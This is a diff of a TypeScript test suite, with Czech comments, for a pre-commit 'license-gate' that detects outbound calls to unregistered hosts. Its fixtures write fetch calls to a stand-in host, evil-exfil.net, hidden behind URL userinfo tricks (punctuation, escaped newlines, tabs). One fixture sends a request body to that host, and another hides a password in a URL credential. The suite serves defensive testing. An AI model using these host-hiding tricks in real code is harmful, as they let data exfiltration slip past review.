@@ -584,24 +584,40 @@ describe('license-gate: pokrytí (kontroly 3 a 5)', () => {
     expect(out).toContain('zpětné lomítko');
   });
 
-  it('konec řádku escapem před @ cíl neskryje — fetch ho z URL taky zahodí', () => {
-    const dir = makeGreenRepo();
-    write(dir, 'src/nl.ts', "await fetch('https://api.fixture-provider.io\\n@evil-exfil.net/v1');\n");
+  // Autoritu URL ukončí podle WHATWG **jen `/ ? # \`** — všechno ostatní se do
+  // ní složí, včetně mezery, uvozovky a `<`. Naměřeno nad celým tisknutelným
+  // ASCII. Vyjmenovat „znaky, po kterých autorita pokračuje" tedy nejde a dvě
+  // remediační kola se o to marně pokusila; každý takový výčet je jen seznam
+  // děr, na které zatím nikdo nesáhl. Test je proto tabulkový a asserce jmenuje
+  // **skutečný cíl**, ne jen číslo kontroly: `toEqual([5])` samo projde i tehdy,
+  // když kontrola 5 spadla z úplně jiného důvodu.
+  it.each(['$', ',', ';', '<', '>', '(', ')', '{', '}', '[', ']', '"', ' '])(
+    'znak %j před @ skutečný cíl neskryje',
+    (znak) => {
+      const dir = makeGreenRepo();
+      write(dir, 'src/hide.ts', `await fetch('https://api.fixture-provider.io${znak}@evil-exfil.net/v1');\n`);
 
-    const { code, out } = run(LICENSE_GATE, dir);
-    expect(failedChecks(out)).toEqual([5]);
-    expect(out).toContain('autorita URL pokračuje');
-    expect(code).toBe(1);
-  });
+      const { code, out } = run(LICENSE_GATE, dir);
+      expect(failedChecks(out)).toEqual([5]);
+      expect(out).toContain('evil-exfil.net');
+      expect(code).toBe(1);
+    },
+  );
 
-  it('konec řádku zapsaný unicode escapem cíl neskryje ani tak', () => {
-    const dir = makeGreenRepo();
-    // Unicode zápis konce řádku je totéž jako krátký escape, jen jinou cestou
-    // v dekodéru — a bez vlastního testu ta druhá cesta nebyla pokrytá.
-    write(dir, 'src/nlu.ts', "await fetch('https://api.fixture-provider.io\\u000A@evil-exfil.net/v1');\n");
+  // `fetch` tyhle znaky z URL zahazuje, takže cíl je až za nimi. Každý zápis má
+  // vlastní cestu dekodérem — krátký escape jednu, unicode zápis druhou — a bez
+  // obou variant zůstane jedna z nich nepokrytá.
+  it.each(['\\n', '\\r', '\\t', '\\u000A', '\\u000D', '\\u0009'])(
+    'neviditelný znak zapsaný %s před @ cíl neskryje',
+    (escape) => {
+      const dir = makeGreenRepo();
+      write(dir, 'src/inv.ts', `await fetch('https://api.fixture-provider.io${escape}@evil-exfil.net/v1');\n`);
 
-    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([5]);
-  });
+      const { out } = run(LICENSE_GATE, dir);
+      expect(failedChecks(out)).toEqual([5]);
+      expect(out).toContain('evil-exfil.net');
+    },
+  );
 
   it('skutečný konec řádku v šablonovém literálu cíl neskryje', () => {
     const dir = makeGreenRepo();
@@ -609,14 +625,54 @@ describe('license-gate: pokrytí (kontroly 3 a 5)', () => {
     // z URL zahodí stejně jako `\n`.
     write(dir, 'src/tplnl.ts', 'export const u = `https://api.fixture-provider.io\n@evil-exfil.net/v1`;\n');
 
-    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([5]);
+    const { out } = run(LICENSE_GATE, dir);
+    expect(failedChecks(out)).toEqual([5]);
+    expect(out).toContain('evil-exfil.net');
   });
 
-  it('znak mimo třídu před @ cíl taky neskryje', () => {
+  it('apostrof v JSX textu neoslepí kontrolu na zbytek řádku', () => {
     const dir = makeGreenRepo();
-    write(dir, 'src/dollar.ts', "await fetch('https://api.fixture-provider.io$@evil-exfil.net/v1');\n");
+    // `Let's go` je běžný text, ne útok. Lichý apostrof ale rozhodí stav
+    // uvozovek, `https:` pak stojí mimo řetězec, jeho `//` spustí režim
+    // komentáře a **zbytek řádku i s hostem zmizel úplně** — brána nad voláním
+    // na `evil-exfil.net` hlásila 7/7 PASS.
+    write(
+      dir,
+      'src/Hero.tsx',
+      "export const Hero = () => <p>Let's go</p>;\n" +
+        "export async function send(s: string) { await fetch('https://evil-exfil.net/v1', { body: s }); }\n",
+    );
 
-    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([5]);
+    const { code, out } = run(LICENSE_GATE, dir);
+    expect(failedChecks(out)).toEqual([5]);
+    expect(out).toContain('evil-exfil.net');
+    expect(code).toBe(1);
+  });
+
+  it('adresa na konci literálu bez cesty se přečte celá a nic si nepřibere', () => {
+    const dir = makeGreenRepo();
+    // Autoritu tu neukončí `/`, ale konec řetězce — jediný případ, kdy je značka
+    // konce literálu skutečně nosná. Bez ní čtení přeteče do dalšího řetězce a
+    // host se **tiše ztratí**; se značkou na špatné straně uvozovky si k sobě
+    // přibere apostrof a nález pak jmenuje host, který neexistuje.
+    write(dir, 'src/base.ts', "const a = 'https://po-prvnim.io';\nconst b = 'user@druhy.net';\n");
+
+    const { code, out } = run(LICENSE_GATE, dir);
+    expect(failedChecks(out)).toEqual([5]);
+    expect(out).toContain('po-prvnim.io');
+    expect(out).not.toContain("po-prvnim.io'");
+    expect(code).toBe(1);
+  });
+
+  it('ternární operátor před komentářem není schéma', () => {
+    const dir = makeGreenRepo();
+    // Výjimka pro `://` musí být úzká: `x ? a : // pozn.` má dvojtečku těsně
+    // před lomítky a komentářem zůstat musí, jinak by se za ním schoval host.
+    write(dir, 'src/tern.ts', "const a = x ? y : // pozn.\n  z;\nfetch('https://po-ternaru.io/v1');\n");
+
+    const { out } = run(LICENSE_GATE, dir);
+    expect(failedChecks(out)).toEqual([5]);
+    expect(out).toContain('po-ternaru.io');
   });
 
   it('šipková funkce s regulárním výrazem neoslepí kontrolu na host pod ní', () => {
@@ -631,13 +687,31 @@ describe('license-gate: pokrytí (kontroly 3 a 5)', () => {
     expect(code).toBe(1);
   });
 
-  it('věta s adresou uprostřed řetězce se za useknutou autoritu nepovažuje', () => {
-    const dir = makeGreenRepo();
-    // Skutečná mezera je mezera, ne escapem podstrčený neviditelný znak. Kdyby
-    // se to nerozlišilo, brána by hlásila každou takovou větu.
-    write(dir, 'src/prose.ts', "export const hint = 'viz https://api.fixture-provider.io a pak dál';\n");
+  // Věta, ve které adresa jen stojí, není volaný endpoint: `new URL()` takovou
+  // autoritu odmítne, takže `fetch` by na ní skončil výjimkou, ne požadavkem.
+  // Brána, která hlásí věty, se obejde přes `--no-verify` — a tím se vypne i ta
+  // druhá, takže falešný nález je tu stejně vážný jako díra.
+  it.each([', sekce 3', '; sekce 3', ' a pak dál', ' (viz níž)', ' — konec'])(
+    'věta pokračující %j za adresou není nález',
+    (pokracovani) => {
+      const dir = makeGreenRepo();
+      write(dir, 'src/prose.ts', `export const hint = 'viz https://api.fixture-provider.io${pokracovani}';\n`);
 
-    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([]);
+      expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([]);
+    },
+  );
+
+  it('věta, ve které za adresou stojí e-mail, nález JE — a je to správně', () => {
+    const dir = makeGreenRepo();
+    // Vypadá to jako falešný nález, ale není: `new URL()` z toho udělá userinfo
+    // a host `firma.cz`, takže kdyby ten řetězec někdo poslal do `fetch`,
+    // požadavek jde tam. Je to cena za to, že výčet znaků zmizel — a je
+    // zapsaná tady, aby ji příští kolo nesmazalo jako omyl.
+    write(dir, 'src/mail.ts', "export const t = 'viz https://api.fixture-provider.io nebo pis na podpora@firma.cz';\n");
+
+    const { out } = run(LICENSE_GATE, dir);
+    expect(failedChecks(out)).toEqual([5]);
+    expect(out).toContain('firma.cz');
   });
 
   it('lokální server s portem skládaným za běhu není nález', () => {
@@ -778,6 +852,16 @@ describe('license-gate: čisté funkce', () => {
     expect(found[0]).not.toContain('tajneheslo');
     expect(found[0]).not.toContain('nevypisovat');
     expect(found[0]).toContain('nedá se rozparsovat');
+  });
+
+  it('credentialUrlsIn najde údaj schovaný za znakem mimo znakovou třídu', () => {
+    // Týž trik jako u hostu: třída skončí na `<`, takže bez čtení celé autority
+    // se parsuje jen `https://user:pass` — bez `@`, tedy bez údaje. A `hostsIn`
+    // nad tím vrátí registrovaný host, takže by údaj neohlásila ani jedna
+    // kontrola a heslo by odešlo do veřejného repozitáře.
+    const found = [...credentialUrlsIn("fetch('https://user:tajneheslo<@api.fixture-provider.io/v1');")];
+    expect(found).toEqual(['https://***@api.fixture-provider.io/…']);
+    expect(found[0]).not.toContain('tajneheslo');
   });
 
   it('credentialUrlsIn nevypíše cestu', () => {
